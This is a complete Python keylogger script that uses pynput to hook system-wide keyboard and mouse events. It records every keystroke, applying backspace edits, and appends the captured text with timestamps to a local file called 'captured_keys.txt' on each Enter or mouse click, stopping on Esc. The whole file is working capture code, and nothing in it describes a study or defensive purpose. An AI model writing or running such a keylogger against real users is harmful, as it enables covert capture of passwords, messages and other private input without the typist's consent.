from pynput.keyboard import Key, Listener
from pynput import mouse
import datetime

fullog = ''
words = ''
log_file = 'captured_keys.txt'

def onPress(key):
    global fullog
    global words

    if key == Key.space:
        words += ' '

    elif key == Key.enter:
        fullog += words + '\n'
        save_to_file(fullog)
        words = ''
        fullog = ''

    #elif key == Key.ctrl_l or key == Key.ctrl_r or key == Key.tab or key == Key.caps_lock or key == Key.shift_l or key == Key.shift_r:
        #pass

    elif key == Key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = char.replace("'", "")
        words += char
    
    if key == Key.esc:
        return False
    

def click(x, y, button, pressed):
    global fullog
    global words

    if len(words) > 0 and pressed:
        fullog += words + '\n'
        save_to_file(fullog)
        words = ''    
        fullog = ''
    else:
        pass


def save_to_file(message):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f'[{timestamp}]\n{message}\n---\n')


def main():
    with Listener(on_press=onPress) as k_listener, mouse.Listener(on_click=click) as m_listener:
        k_listener.join()
        m_listener.join()


if __name__ == "__main__":
    main()
